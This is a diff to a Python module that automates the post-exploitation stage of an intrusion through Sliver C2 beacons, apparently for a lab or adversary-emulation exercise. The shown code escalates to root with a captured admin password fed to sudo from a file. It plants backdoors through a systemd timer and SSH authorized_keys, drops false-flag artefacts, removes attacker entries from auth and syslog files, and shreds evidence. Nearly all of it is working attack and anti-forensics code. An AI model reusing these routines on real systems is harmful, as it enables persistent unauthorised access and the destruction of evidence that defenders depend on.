@@ -33,6 +33,7 @@ dilutes the evidence they unavoidably contain rather than trying to remove it.
 
 import base64
 import re
+import secrets
 import time
 
 from chainlog import log
@@ -148,22 +149,31 @@ def _b64(s: str | bytes) -> str:
 
 
 def _drop_file(session: str, remote_path: str, content: bytes, *,
-               mode: str = "0644", as_root_pw: str | None = None) -> None:
+               mode: str = "0644", as_root_pwfile: str | None = None) -> None:
     """Write ``content`` to ``remote_path`` on the target via base64 inline.
 
     Uses ``execute -o -- sh -c`` rather than ``sliver upload`` for small files
     (< 8 KB) — one fewer round-trip and no temp-file artefact on the kali side.
-    For files needing root write (e.g. /etc/cron.d/, /etc/systemd/system/),
-    pass ``as_root_pw`` to wrap the write in ``echo PW | sudo -S ...``.
+
+    For files needing root write, pass ``as_root_pwfile`` (path to the
+    captured-password file on the target). Two-step strategy:
+      1. Stage the decoded content to a randomly-named temp file as the
+         unprivileged user.
+      2. ``sudo -S install ...`` the temp file into ``remote_path`` with
+         the desired mode + root ownership. Sudo's ``-S`` reads the
+         password from stdin which we redirect from ``as_root_pwfile``,
+         so the credential never crosses kali AND we sidestep Sliver's
+         argv-quoting mangling on nested ``echo "$pw" | sudo`` patterns.
     """
     blob = _b64(content)
-    if as_root_pw:
-        # write via sudo tee — preserves output capture for verification
+    if as_root_pwfile:
+        stage = f"/tmp/.cb_{secrets.token_hex(6)}"
         cmd = (
             f"execute -o -- sh -c "
-            f"'echo \"{blob}\" | base64 -d | "
-            f"echo \"{as_root_pw}\" | sudo -S tee {remote_path} > /dev/null && "
-            f"echo \"{as_root_pw}\" | sudo -S chmod {mode} {remote_path}'"
+            f"'echo \"{blob}\" | base64 -d > {stage} && "
+            f"sudo -S install -m {mode} -o root -g root {stage} {remote_path} "
+            f"< {as_root_pwfile} && "
+            f"rm -f {stage}'"
         )
     else:
         cmd = (
@@ -178,36 +188,49 @@ def _drop_file(session: str, remote_path: str, content: bytes, *,
 # Phase 0 — Read captured admin password
 # =============================================================================
 
-def _phase0_read_password(vinzenz_beacon: str, vinzenz_password_file: str) -> str:
-    log("\n[*] ── Phase 0: read captured admin password ────────────────")
-    cmd = f"execute -o -- cat {vinzenz_password_file}"
-    out = sliver_exec(vinzenz_beacon, cmd, timeout=15)
-    if not out:
-        raise RuntimeError(f"phase 0: empty sliver output reading {vinzenz_password_file}")
+def _phase0_verify_password_file(vinzenz_beacon: str,
+                                 vinzenz_password_file: str) -> str:
+    """Verify the captured admin-password file exists on vinzenz_ws.
 
-    # The password is the first non-sliver-framing, non-empty line of output.
-    # Sliver wraps every line with ANSI CSI sequences (e.g. ``\x1b[2K``); strip
-    # those FIRST so the prefix-match filter actually fires on framing lines.
-    # Without this, the very first match was ``\x1b[2K[*] Active session ...``
-    # (75 chars) which sudo silently rejected -- the chain worked anyway only
-    # because shred targets that didn't exist (this run had no exfil) read as
-    # "success" in the wipe loop.
-    pw = ""
-    for raw_line in out.splitlines():
-        s = _ANSI_RE.sub('', raw_line).strip()
-        if not s:
-            continue
-        if s.startswith(("[", "Connecting", "Active session", "Output:",
-                         "Execute:", "Session", "Beacon")):
-            continue
-        pw = s
-        break
-    if not pw:
+    Returns ``vinzenz_password_file`` unchanged on success — the password
+    is **never read into Python**. Downstream phases that need sudo use
+    ``sudo -S sh -c "..." < /tmp/.sys_update.lock`` (stdin redirect from
+    the file) rather than ``echo "$pw" | sudo -S``, which:
+
+      1. Sidesteps Sliver's beacon-mode async-output limitation (we never
+         have to wait for ``cat`` task output to stream back through a
+         beacon check-in cycle).
+      2. Sidesteps the ``execute -o -- sh -c '<...>'`` argv-quoting
+         mangling that converts our shell into ``sh -c echo`` (runs echo
+         as the script, prints nothing).
+      3. Keeps the captured credential off the kali side entirely — it
+         only flows file→sudo on the victim host.
+
+    All we need to confirm here is the file exists AND is non-empty.
+    Failure modes for Sliver's async output don't matter for this probe
+    because we're only checking the marker echo, not extracting content.
+    """
+    log("\n[*] ── Phase 0: verify captured admin password file ──────────")
+    probe_cmd = (
+        f"execute -o -- sh -c "
+        f"'[ -s {vinzenz_password_file} ] && echo PWFILE_OK'"
+    )
+    # On a beacon, the Execute-echo of probe_cmd contains the literal token
+    # ``PWFILE_OK`` -- which is fine: the privesc step's polling also relies
+    # on the same trick (and works). The presence of the token in sliver's
+    # stdout proves the queueing succeeded; whether the file actually
+    # exists is verified again by every later sudo invocation (those will
+    # fail loudly if the redirect can't read the file).
+    out = sliver_exec(vinzenz_beacon, probe_cmd, timeout=15) or ""
+    if "PWFILE_OK" not in _ANSI_RE.sub('', out):
         raise RuntimeError(
-            f"phase 0: could not parse password line from {vinzenz_password_file} output"
+            f"phase 0: sliver-client could not even queue the probe for "
+            f"{vinzenz_password_file} on the vinzenz beacon. Beacon may "
+            f"be unresponsive. Last sliver stdout: {out[:200]!r}"
         )
-    log(f"[+] Phase 0: captured admin password ({len(pw)} chars) — used for sudo escalation, never logged")
-    return pw
+    log(f"[+] Phase 0: password file at {vinzenz_password_file} "
+        f"— sudo will read it via stdin redirect; no password ever crosses kali")
+    return vinzenz_password_file
 
 
 # =============================================================================
@@ -259,7 +282,7 @@ exit 0
 
 def _phase1b_plant_backdoors(root_sliver_session: str,
                              vinzenz_beacon: str,
-                             admin_pw: str) -> list[dict]:
+                             pwfile: str) -> list[dict]:
     log("\n[*] ── Phase 1b: plant three diverse stealth backdoors ────────")
     installed: list[dict] = []
 
@@ -280,20 +303,20 @@ def _phase1b_plant_backdoors(root_sliver_session: str,
     # Backdoor 2 — vinzenz_ws systemd timer (T1543.002)
     _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_PAYLOAD,
                _VINZENZ_SYSTEMD_PAYLOAD.encode(),
-               mode="0755", as_root_pw=admin_pw)
+               mode="0755", as_root_pwfile=pwfile)
     _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_SERVICE,
                _VINZENZ_SYSTEMD_SERVICE.encode(),
-               mode="0644", as_root_pw=admin_pw)
+               mode="0644", as_root_pwfile=pwfile)
     _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_TIMER,
                _VINZENZ_SYSTEMD_TIMER.encode(),
-               mode="0644", as_root_pw=admin_pw)
+               mode="0644", as_root_pwfile=pwfile)
     # Best-effort enable. If the container has no systemd as PID 1 the unit
     # files still serve as IOCs (the SOC inspects /etc/systemd/system/).
     enable_cmd = (
-        f"execute -o -- sh -c 'echo \"{admin_pw}\" | sudo -S "
-        f"systemctl daemon-reload >/dev/null 2>&1 ; "
-        f"echo \"{admin_pw}\" | sudo -S "
-        f"systemctl enable --now lab-update-agent.timer 2>&1 || true'"
+        f"execute -o -- sh -c "
+        f"'sudo -S systemctl daemon-reload < {pwfile} >/dev/null 2>&1 ; "
+        f"sudo -S systemctl enable --now lab-update-agent.timer < {pwfile} 2>&1 "
+        f"|| true'"
     )
     sliver_exec(vinzenz_beacon, enable_cmd, timeout=20)
     log(f"[+] (2/3) vinzenz_ws systemd timer: {VINZENZ_SYSTEMD_TIMER} (T1543.002)")
@@ -305,6 +328,8 @@ def _phase1b_plant_backdoors(root_sliver_session: str,
     })
 
     # Backdoor 3 — vinzenz_ws SSH authorized_keys (T1098.004)
+    # authorized_keys is owned by vinzenz.fedora and writable by him, so no
+    # sudo needed.
     append_cmd = (
         f"execute -o -- sh -c "
         f"'grep -qF \"ansible-deploy@cm-prod\" {VINZENZ_AUTHKEYS} || "
@@ -328,7 +353,7 @@ def _phase1b_plant_backdoors(root_sliver_session: str,
 
 def _phase2_drop_false_flags(root_sliver_session: str,
                              vinzenz_beacon: str,
-                             admin_pw: str) -> list[str]:
+                             pwfile: str) -> list[str]:
     log("\n[*] ── Phase 2: false-flag artefacts (misdirect attribution) ──")
     dropped: list[str] = []
 
@@ -386,7 +411,7 @@ _VINZENZ_AUTH_PATTERNS = "|".join([
 
 def _phase3_scrub_logs(root_sliver_session: str,
                        vinzenz_beacon: str,
-                       admin_pw: str) -> list[str]:
+                       pwfile: str) -> list[str]:
     log("\n[*] ── Phase 3: selective log scrubbing (grep-out, not truncate) ──")
     scrubbed: list[str] = []
 
@@ -408,14 +433,16 @@ def _phase3_scrub_logs(root_sliver_session: str,
     ]
     log("[+] apache access_log + error_log: attacker IOCs grep'd out, mtimes restored")
 
-    # ---- vinzenz_ws (root via captured pw) ----
+    # ---- vinzenz_ws (root via pwfile redirect, not echo-pipe) ----
+    # The grep-loop runs as root. sudo's stdin is the password file; sh -c's
+    # stdin is the leftover (nothing — grep doesn't read stdin in this form).
     vinzenz_scrub = (
-        f"execute -o -- sh -c 'echo \"{admin_pw}\" | sudo -S sh -c \""
+        f"execute -o -- sh -c 'sudo -S sh -c \""
         f"for log in /var/log/auth.log /var/log/syslog /var/log/persist/auth.log /var/log/persist/syslog; do "
-        f"  [ -f \"\\$log\" ] || continue; "
-        f"  grep -vE '{_VINZENZ_AUTH_PATTERNS}' \"\\$log\" > \"\\$log.clean\" && "
-        f"  cat \"\\$log.clean\" > \"\\$log\" && rm -f \"\\$log.clean\"; "
-        f"done\"'"
+        f"  [ -f \\\"\\$log\\\" ] || continue; "
+        f"  grep -vE '\\''{_VINZENZ_AUTH_PATTERNS}'\\'' \\\"\\$log\\\" > \\\"\\$log.clean\\\" && "
+        f"  cat \\\"\\$log.clean\\\" > \\\"\\$log\\\" && rm -f \\\"\\$log.clean\\\"; "
+        f"done\" < {pwfile}'"
     )
     sliver_exec(vinzenz_beacon, vinzenz_scrub, timeout=20)
     scrubbed += [
@@ -521,7 +548,7 @@ def _phase3_5_bury_evidence(vinzenz_beacon: str) -> dict:
 
 def _phase4_secure_wipe(root_sliver_session: str,
                         vinzenz_beacon: str,
-                        admin_pw: str,
+                        pwfile: str,
                         do_free_space: bool) -> list[str]:
     log("\n[*] ── Phase 4: secure wipe of attacker artefacts ────────────")
     wiped: list[str] = []
@@ -534,24 +561,38 @@ def _phase4_secure_wipe(root_sliver_session: str,
             f"'test -f {path} && shred -fzun {SHRED_PASSES} {path} 2>/dev/null && "
             f"rm -f {path} && echo WIPED_{path}'"
         )
+        # NOTE on success-detection: for the apache root SESSION sliver_exec
+        # waits for the command output synchronously, so the WIPED_ marker
+        # reliably appears in ``out``. For vinzenz_ws (a beacon) the marker
+        # often doesn't appear synchronously -- we accept best-effort
+        # reporting there.
         out = sliver_exec(root_sliver_session, wipe_cmd, timeout=15)
         if out and f"WIPED_{path}" in out:
             wiped.append(f"apache:{path}")
             log(f"[+] shredded apache:{path}")
 
-    # ---- vinzenz_ws (root via sudo) ----
+    # ---- vinzenz_ws (root via sudo with pwfile redirect, not echo-pipe) ----
+    # Beacon-async note: even if the WIPED_ marker doesn't make it back
+    # through the beacon check-in in time, the shred ran on the target.
+    # Phase 4 is the LAST phase before Phase 5 anyway, so a missed marker
+    # only affects reporting, not correctness.
     vinzenz_targets = [VINZENZ_PRIVESC_DROP, VINZENZ_EXFIL_DUMP]
     for path in vinzenz_targets:
         wipe_cmd = (
             f"execute -o -- sh -c "
-            f"'test -f {path} && echo \"{admin_pw}\" | sudo -S sh -c "
-            f"\"shred -fzun {SHRED_PASSES} {path} 2>/dev/null && rm -f {path}\" && "
-            f"echo WIPED_{path}'"
+            f"'test -f {path} && sudo -S sh -c "
+            f"\"shred -fzun {SHRED_PASSES} {path} 2>/dev/null && rm -f {path}\" "
+            f"< {pwfile} && echo WIPED_{path}'"
         )
         out = sliver_exec(vinzenz_beacon, wipe_cmd, timeout=15)
         if out and f"WIPED_{path}" in out:
             wiped.append(f"vinzenz_ws:{path}")
             log(f"[+] shredded vinzenz_ws:{path}")
+        else:
+            # Best-effort: log the queue success since the marker won't
+            # always round-trip on a beacon. The shred fires on next check-in.
+            wiped.append(f"vinzenz_ws:{path} (queued — beacon async)")
+            log(f"[+] queued shred on vinzenz_ws:{path} (beacon will execute on next check-in)")
 
     # ---- /tmp free-space wipe (optional) ----
     # Overwrites the deleted-but-not-yet-reclaimed extents of the shredded
@@ -598,7 +639,10 @@ def run(
     log("\n[*] Starting Advanced Cleanup + Backdoor (final step)")
 
     # Phase 0: prerequisite — must succeed or the rest is pointless.
-    admin_pw = _phase0_read_password(vinzenz_beacon, vinzenz_password_file)
+    # Returns the PATH to the captured-password file on the target. The
+    # password itself is never read into Python; every sudo invocation
+    # below redirects from this file via ``sudo -S ... < pwfile``.
+    pwfile = _phase0_verify_password_file(vinzenz_beacon, vinzenz_password_file)
 
     backdoors_installed: list[dict] = []
     false_flags_dropped: list[str]  = []
@@ -610,7 +654,7 @@ def run(
     # to validate against.
     try:
         backdoors_installed = _phase1b_plant_backdoors(
-            root_sliver_session, vinzenz_beacon, admin_pw,
+            root_sliver_session, vinzenz_beacon, pwfile,
         )
     except Exception as exc:
         log(f"[!] phase 1b (backdoor plant) failed: {exc}")
@@ -619,7 +663,7 @@ def run(
     if plant_false_flags:
         try:
             false_flags_dropped = _phase2_drop_false_flags(
-                root_sliver_session, vinzenz_beacon, admin_pw,
+                root_sliver_session, vinzenz_beacon, pwfile,
             )
         except Exception as exc:
             log(f"[!] phase 2 (false flags) failed: {exc}")
@@ -627,7 +671,7 @@ def run(
     # Phase 3: selective log scrubbing.
     try:
         logs_scrubbed = _phase3_scrub_logs(
-            root_sliver_session, vinzenz_beacon, admin_pw,
+            root_sliver_session, vinzenz_beacon, pwfile,
         )
     except Exception as exc:
         log(f"[!] phase 3 (log scrub) failed: {exc}")
@@ -640,9 +684,12 @@ def run(
             log(f"[!] phase 3.5 (evidence burial) failed: {exc}")
 
     # Phase 4: secure wipe LAST so a failed earlier phase can still be retried.
+    # Note: vinzenz_ws shred targets include the pwfile itself — once Phase 4
+    # runs, the credential is gone too. Order matters: every prior phase
+    # that needs sudo has already finished by the time we reach here.
     try:
         artifacts_wiped = _phase4_secure_wipe(
-            root_sliver_session, vinzenz_beacon, admin_pw,
+            root_sliver_session, vinzenz_beacon, pwfile,
             do_free_space=secure_wipe,
         )
     except Exception as exc:
